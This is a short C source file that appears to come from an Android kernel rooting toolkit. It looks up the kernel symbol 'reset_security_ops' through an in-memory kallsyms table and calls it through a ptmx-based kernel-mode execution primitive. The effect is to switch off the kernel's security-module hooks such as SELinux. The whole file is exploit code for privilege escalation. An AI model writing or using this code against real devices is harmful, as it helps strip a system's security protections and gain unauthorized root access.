#define _LARGEFILE64_SOURCE
#include <stdio.h>

#include "libkallsyms/kallsyms_in_memory.h"
#include "ptmx.h"

bool has_reset_security_ops(kallsyms *info)
{
  return kallsyms_in_memory_lookup_name(info, "reset_security_ops") != 0;
}

static bool
call_reset_security_ops(void *user_data)
{
  void (*reset_security_ops_func)(void) = user_data;

  reset_security_ops_func();
  return true;
}

bool run_reset_security_ops(kallsyms *info)
{
  unsigned long reset_security_ops_address = kallsyms_in_memory_lookup_name(info, "reset_security_ops");

  return ptmx_run_in_kernel_mode(call_reset_security_ops, (void *)reset_security_ops_address);
}
